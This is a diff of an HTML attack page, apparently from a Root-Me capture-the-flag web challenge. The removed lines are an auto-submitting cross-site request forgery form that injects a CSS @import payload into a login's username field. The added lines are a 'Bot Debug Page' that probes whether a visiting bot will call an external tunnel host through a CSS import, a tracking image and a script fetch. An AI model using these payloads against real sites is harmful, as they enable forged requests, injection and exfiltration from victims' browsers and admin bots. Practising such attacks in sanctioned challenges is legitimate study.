@@ -1,14 +1,18 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form id="exploit-form" action="http://challenge01.root-me.org:58039/login" method="POST">
-      <input type="hidden" name="password" value="fakepass" />
-      <input type="hidden" name="_csrf" value="DUMMY_TOKEN" />
+<head>
+    <title>Bot Capability Test</title>
+    <style>
+        @import url('https://8947e405a38b9a.lhr.life/test-css-import');
+    </style>
+</head>
+<body>
+    <h1>Bot Debug Page</h1>
 
-      <input type="hidden" name="username" value="<style>@import url(https://8947e405a38b9a.lhr.life/css_import_works);</style>" />
-    </form>
-    
+    <img src="https://8947e405a38b9a.lhr.life/test-img-src" width="1" height="1">
+
     <script>
-      document.getElementById('exploit-form').submit();
+        fetch('https://8947e405a38b9a.lhr.life/test-script-fetch');
     </script>
-  </body>
+</body>
 </html>
